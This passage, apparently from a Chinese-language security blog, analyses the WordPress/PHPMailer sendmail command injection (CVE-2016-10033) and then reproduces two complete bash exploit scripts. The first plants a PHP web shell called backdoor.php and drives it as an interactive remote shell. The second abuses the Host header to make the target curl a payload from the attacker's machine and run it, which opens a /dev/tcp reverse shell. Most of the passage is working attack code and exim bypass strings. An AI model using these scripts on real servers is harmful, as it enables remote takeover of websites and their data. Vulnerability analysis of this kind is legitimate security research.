class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;wordpress@&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$sitename&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$phpmailer&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;setFrom&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$from_email&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$from_name&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;code&gt;$_SERVER [&#39;SERVER_NAME&#39;]&lt;/code&gt;  来自包中的 Host，也就是说 &lt;code&gt;from_email&lt;/code&gt;  可控&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;命令注入&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;phpmailer 最后调用了 sendmail&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;在服务器上生成&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;/usr/bin/sendmail -t -i -fwordpress@inject&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;利用 comment 绕过对空格的过滤 (RFC822)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;如：&lt;/p&gt;
&lt;p&gt;HOST:inject(tmp1 inject tmp2)&lt;/p&gt;
&lt;p&gt;&lt;code&gt;/usr/bin/sendmail -t -i -fwordwordpress@inject(tmp1 inject tmp2)&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;获得 sendmail 的命令注入后。通常情况下&lt;/p&gt;
&lt;p&gt;-O QueueDirectory=/tmp/ -X/var/www/html/backdoor.php&lt;/p&gt;
&lt;p&gt;-X 指定写的 log 文件，造成任意文件写入，写 webshell&lt;/p&gt;
&lt;p&gt;但由于源代码中有 strtolower 函数，全部转为小写，因此该方式不能利用&lt;/p&gt;
&lt;p&gt;所以在 exim4 直接命令执行&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;sendmail -be &#39;${run}{/bin/true}{true}{false}&#39;&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;不需要猜测网站路径直接执行命令进行写文件&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;但由于没有继承系统环境变量，执行命令需要绝对路径&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;在上面中，由于需要绝对路径，那么必须要用到 /&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;这里利用 exim4 的变量绕过斜杠和空格限制&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;sendmail -be &#39;${spool_directory}&#39;&lt;/code&gt; = &amp;gt; /var/spool/exim4&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;sendmail -be &#39;{tod_log}&#39;&lt;/code&gt;  = &amp;gt; 返回本地时间如 &lt;code&gt;2022-08-30 20:39:40&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;字符串切割 &#39;/&#39; = &amp;gt;  &lt;code&gt;{substr{0}{1}{spool_directory}}&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;字符串切割 &#39; &#39; = &amp;gt;  &lt;code&gt;{substr{10}{1}{tod_log}}&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;最终需要执行的命令为&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;sendmail&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-be&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;${run{/bin/touch /tmp/test}&#39;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;#在 tmp 创建 test 文件&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;sendmail&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-be&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;${run{${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}touch${substr{10}{1}{$tod_log}}${substr{0}{1}{$spool_directory}}tmp${substr{0}{1}{$spool_directory}}test}&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;漏洞触发点 (/wp-admin,lost password 选项，，输入 email 点击后会执行 sendmail)&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;漏洞 poc&lt;/p&gt;
&lt;figure class=&#34;highlight raw&#34;&gt;&lt;figcaption data-lang=&#34;&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;#!/bin/bash&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;# CVE-2016-10033 exploit by opsxcq&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;# https://github.com/opsxcq/exploit-CVE-2016-10033&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;echo &#39;[+] CVE-2016-10033 exploit by opsxcq&#39;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;if [ -z &#34;$1&#34; ]&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;then&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    echo &#39;[-] Please inform an host as parameter&#39;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    exit -1&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;fi&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;if [ $(uname) == &#39;Darwin&#39; ]&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;then&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    decoder=&#39;base64 -D&#39;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;elif [ $(uname) == &#39;Linux&#39; ]&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;then&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    decoder=&#39;base64 -d&#39;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;else&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    echo &#39;[-] Your platform isnt supported: &#39;$(uname)&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    exit -1&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;fi&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;host=$1&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;echo &#39;[+] Exploiting &#39;$host&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;curl -sq &#39;http://&#39;$host -H &#39;Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryzXJpHSq4mNy35tHe&#39; --data-binary $&#39;------WebKitFormBoundaryzXJpHSq4mNy35tHe\r\nContent-Disposition: form-data; name=&#34;action&#34;\r\n\r\nsubmit\r\n------WebKitFormBoundaryzXJpHSq4mNy35tHe\r\nContent-Disposition: form-data; name=&#34;name&#34;\r\n\r\n&amp;lt;?php echo &#34;|&#34;.base64_encode(system(base64_decode($_GET[&#34;cmd&#34;]))).&#34;|&#34;; ?&amp;gt;\r\n------WebKitFormBoundaryzXJpHSq4mNy35tHe\r\nContent-Disposition: form-data; name=&#34;email&#34;\r\n\r\n\&#34;vulnerables\\\&#34; -OQueueDirectory=/tmp -X/www/backdoor.php server\&#34; @test.com\r\n------WebKitFormBoundaryzXJpHSq4mNy35tHe\r\nContent-Disposition: form-data; name=&#34;message&#34;\r\n\r\nPwned\r\n------WebKitFormBoundaryzXJpHSq4mNy35tHe--\r\n&#39; &amp;gt;/dev/null &amp;amp;&amp;amp; echo &#39;[+] Target exploited, acessing shell at http://&#39;$host&#39;/backdoor.php&#39;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;30&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;31&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;32&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;echo &#39;[+] Checking if the backdoor was created on target system&#39;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;33&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;code=$(curl -o /dev/null --silent --head --write-out &#39;%{http_code}\n&#39; &#34;http://$host/backdoor.php&#34;)&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;34&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;35&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;if [ &#34;$code&#34; != &#34;200&#34; ]&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;36&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;then&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;37&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    echo &#39;[-] Target cant be exploited&#39;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;38&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    exit -1&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;39&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;else&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;40&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    echo &#39;[+] Backdoor.php found on remote system&#39;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;41&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;fi&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;42&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;43&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;cmd=&#39;whoami&#39;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;44&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;while [ &#34;$cmd&#34; != &#39;exit&#39; ]&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;45&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;do&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;46&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    echo &#39;[+] Running &#39;$cmd&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;47&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    if ! curl -sq http://$host/backdoor.php?cmd=$(echo -ne $cmd | base64) | grep &#39;|&#39; | grep -v &#39;base64_encode&#39; | head -n 1 | cut -d &#39;|&#39; -f 2 | $decoder &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;48&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    then&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;49&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        echo &#39;[-] Connection problens&#39;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;50&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        exit -1&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;51&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    fi&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;52&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    echo&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;53&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    read -p &#39;RemoteShell&amp;gt; &#39; cmd&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;54&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;done&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;55&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;echo &#39;[+] Exiting&#39;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;或者&lt;/p&gt;
&lt;figure class=&#34;highlight raw&#34;&gt;&lt;figcaption data-lang=&#34;&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;#!/bin/bash&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;rev_host=&#34;本机地址&#34;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;function prep_host_header () {&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	cmd = &#34;$1&#34;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	rce_cmd = &#34;\${run {$cmd}}&#34;;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	# replace /with ${substr {0}{1}{$spool_directory}}&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	# sed&#39;s^/^${substr {0}{1}{$spool_directory}}^g&#39;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	rce_cmd = &#34;`echo $rce_cmd | sed&#39;s^/^\${substr {0}{1}{\$exim_path}}^g&#39;`&#34;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	# replace &#39; &#39;(space) with &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    # sed&#39;s^ ^${substr {10}{1}{$tod_log}}$^g&#39;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    rce_cmd = &#34;`echo $rce_cmd | sed&#39;s^ ^\${substr {10}{1}{\$tod_log}}^g&#39;`&#34;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    # return &#34;target (any -froot@localhost -be $rce_cmd null)&#34;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    host_header=&#34;a (a -be $rce_cmd p)&#34;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    return 0&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;}&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;# a (a -be ${run {${substr {0}{1}{$exim_path}} usr${substr {0}{1}{$exim_path}} bin${substr {0}{1}{$exim_path}} curl${substr {10}{1}{$tod_log}}-o${substr {0}{1}{$exim_path}} tmp${substr {0}{1}{$exim_path}} r${substr {10}{1}{$tod_log}} 192.168.20.18${substr {0}{1}{$exim_path}} r}} p)&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;if [  &#34;$=&#34; -ne 1 ]; then&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;echo -e &#34;Usage:\n$0 target-wordpress-url\n&#34;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;exit 1&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;fi&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;target=&#34;$1&#34;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;echo -ne &#34;\e [91m [*]\033 [0m&#34;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;echo -e &#34;\e [92m [*]\033 [0m Guess I can&#39;t argue with that... Let&#39;s get started...\n&#34;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;# Server payload/bash script on :80&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;30&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;RCE_exec_cmd=&#34;sleep 3 &amp;amp;&amp;amp; /bin/bash -i &amp;gt;&amp;amp; /dev/tcp/$rev_host/7777 0&amp;gt;&amp;amp;1&#34;  # r 文件的内容&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;31&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;echo &#34;$RCE_exec_cmd&#34; &amp;gt; r&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;32&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;python -m SimpleHTTPServer 80 2&amp;gt;/dev/null &amp;gt;&amp;amp;2 &amp;amp;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;33&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;hpid=$!&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;34&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;35&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;# Save payload on the target in /tmp/rce&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;36&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;cmd=&#34;/usr/bin/curl -o/tmp/r $rev_host/r&#34;  # 将本机的 r 文件写到服务器的 tmp 下的 r 文件&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;37&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;prep_host_header &#34;$cmd&#34;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;38&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;curl -H&#34;Host: $host_header&#34; -s -d &#39;user_login=galigigi&amp;amp;wp-submit=Get+New+Password&#39; $target/wp-login.php?action=lostpassword&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;39&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;echo -e &#34;\n\e [92m [+]\e [0m Payload sent successfully&#34;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;40&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;41&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;# Execute payload (RCE_exec_cmd) on the target /bin/bash/tmp/rce&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;42&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;cmd=&#34;/bin/bash/tmp/r&#34;  # 执行 r 脚本&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;43&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;prep_host_header &#34;$cmd&#34;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td 